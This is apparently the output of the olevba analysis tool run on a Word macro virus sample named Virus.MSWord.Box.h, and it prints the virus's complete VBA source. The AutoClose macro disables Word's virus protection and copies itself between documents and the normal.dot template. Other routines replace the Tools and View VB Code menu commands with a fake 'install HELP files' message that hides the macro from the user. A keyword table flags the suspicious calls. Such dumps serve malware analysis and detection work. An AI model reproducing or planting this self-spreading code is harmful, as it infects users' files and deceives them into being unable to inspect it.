olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Box.h-efb522f218eedd6a164511ad4e35efbca38ffe6b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Box.h-efb522f218eedd6a164511ad4e35efbca38ffe6b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MACRO.bas 
in file: Virus.MSWord.Box.h-efb522f218eedd6a164511ad4e35efbca38ffe6b - OLE stream: 'Macros/VBA/MACRO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "巨集建立於 98/03/13，建立者 AAAA"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"
Dim F$
Dim N$
On Error Resume Next
Options.VirusProtection = False
For ADVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(ADVVC).Name = "MACRO" Then
DocumentInstalled = True
End If
Next
For NTVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(NTVVC).Name = "MACRO" Then
GlobalInstalled = True
End If
Next
If DocumentInstalled = True Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
Options.SavePropertiesPrompt = False
End If
If GlobalInstalled = True Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If

On Error Resume Next
Err = 0
F$ = WordBasic.[FileName$]()
N$ = "normal.dot"
Application.OrganizerCopy Source:=F$, Destination:=N$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](0)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False
On Error Resume Next
Err = 0
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](1)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False
On Error Resume Next
Err = 0
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](2)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False
On Error Resume Next
Err = 0
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](3)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False
On Error Resume Next
Err = 0
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](4)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False


exit_:

End Sub
Sub FileSave()
On Error GoTo exit_:
WordBasic.FileSave
exit_:
End Sub
Sub FileSaveAs()
On Error GoTo exit_:
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
exit_:
End Sub
Sub FileTemplates()
On Error Resume Next
Beep
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue. "
 .Button = msoButtonSetOK
 .Show
End With

End Sub
Sub ToolsMacro()
On Error Resume Next
Beep
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue. "
 .Button = msoButtonSetOK
 .Show
End With

End Sub
Sub ToolsOptions()
On Error Resume Next
Beep
On Error Resume Next
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue."
 .Button = msoButtonSetOK
 .Show
End With


End Sub
Sub ToolsCustomize()
On Error Resume Next
Beep
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue. "
 .Button = msoButtonSetOK
 .Show
End With

End Sub
Sub ViewVBcode()
On Error Resume Next
Beep
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue. "
 .Button = msoButtonSetOK
 .Show
End With

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
